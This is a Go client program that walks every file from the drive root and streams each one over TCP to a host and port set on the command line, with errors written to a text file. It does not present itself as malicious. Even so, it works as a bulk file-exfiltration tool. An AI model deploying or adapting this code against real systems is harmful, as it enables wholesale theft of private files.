package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"flag"
	"strconv"
	"path/filepath"
)

var FileSize float64
var temppath []string
var Addrstring string

func visit(path string, f os.FileInfo, err error) error {

    if !f.IsDir(){
    temppath = append(temppath,path)
    }
    return nil
}

func SendFile(filename string, conn net.Conn) {

	f, err := os.Open(filename)
	if err != nil {
		WriteLog("os.Open err=", err.Error())
		WriteLog("os.Open err=", err.Error())
		return
	}
	defer f.Close()
	
    var sum float64
    sum = 0
	buf := make([]byte, 1024*64)
	for {
		n, err := f.Read(buf)
		if err != nil {
			if err == io.EOF {
				fmt.Println("File transfer complete:",filename)
				WriteLog("File transfer complete:",filename)
			} else {
				WriteLog(" f.Read err=", err.Error())
			}			
			return
		}		
		conn.Write(buf[:n])		
		sum += float64(n)	
		fmt.Printf("\r%.0f%%", sum/FileSize*100)
	}
}

func WriteLog(Tips string, error string) {

	file := "ErrorMessage" + ".txt"
	logFile, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0766)
	if err != nil {
		panic(err)
	}
	logger := log.New(logFile, "\r\n", log.Ldate|log.Ltime)
	logger.Print(Tips, error)
}

func init(){ 
    var user string
    var pwd string
    var host string
    var port int	
    flag.StringVar(&user, "u", "", "用户名,默认为空")
    flag.StringVar(&pwd, "pwd", "", "密码,默认为空")
    flag.StringVar(&host, "h", "localhost","")
    flag.IntVar(&port, "port", 5360,"") 
    flag.Parse()	
	Addrstring = host + ":"+ strconv.Itoa(port)
}

func main() {
	
    root := `\`
    filepath.Walk(root, visit)

	for i := 0; i < len(temppath); i++ {
		info, err := os.Stat(temppath[i])
		if err != nil {
			WriteLog("os.Stat err= ", err.Error())
			return
		}
		fmt.Printf("Send FileName : %s ", info.Name())
		fmt.Println("FileSize : ",info.Size())
		 FileSize64 := info.Size()
		 strInt64 := strconv.FormatInt(FileSize64, 10)
		 FileSize, err = strconv.ParseFloat(strInt64, 64)
		
		conn, err := net.Dial("tcp4", Addrstring)
		if err != nil {
			WriteLog("net.Dial err=", err.Error())
			return
		}
		defer conn.Close()

		_, err = conn.Write([]byte(temppath[i]))
		if err != nil {
			WriteLog("conn.Write err =", err.Error())
			return
		}

		var n = 0
		buf := make([]byte, 1024*8)
		n, err = conn.Read(buf)
		if err != nil {
			WriteLog("conn.Read err=", err.Error())
			return
		}

		if "ok" == string(buf[:n]) {
			SendFile(temppath[i], conn)
			conn.Close()
		}
	}
}
